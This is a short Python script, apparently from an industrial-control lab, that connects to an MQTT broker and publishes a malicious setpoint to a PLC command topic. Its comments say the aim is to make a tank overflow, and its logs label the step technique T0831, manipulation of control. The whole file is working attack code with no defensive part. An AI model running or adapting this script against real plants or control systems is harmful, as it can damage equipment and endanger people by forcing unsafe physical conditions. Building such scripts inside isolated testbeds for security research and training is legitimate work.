import paho.mqtt.client as mqtt
import time
import json
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - ATTACKER - %(message)s')

BROKER = "edge-broker"
PORT = 1883
TOPIC_COMMAND = "factory/plc/command"

def attack():
    client = mqtt.Client()
    logging.info("Connecting to broker to perform T0831: Manipulation of Control...")
    try:
        client.connect(BROKER, PORT, 60)
    except Exception as e:
        logging.error(f"Failed to connect: {e}")
        return

    # Malicious payload to force the tank to overflow
    malicious_payload = {
        "setpoint": 120.0
    }
    
    logging.warning("INJECTING MALICIOUS SETPOINT (T0831)...")
    logging.warning(f"Payload: {malicious_payload}")
    
    client.publish(TOPIC_COMMAND, json.dumps(malicious_payload))
    time.sleep(1)
    client.disconnect()
    logging.info("Attack complete. Setpoint altered.")

if __name__ == "__main__":
    attack()
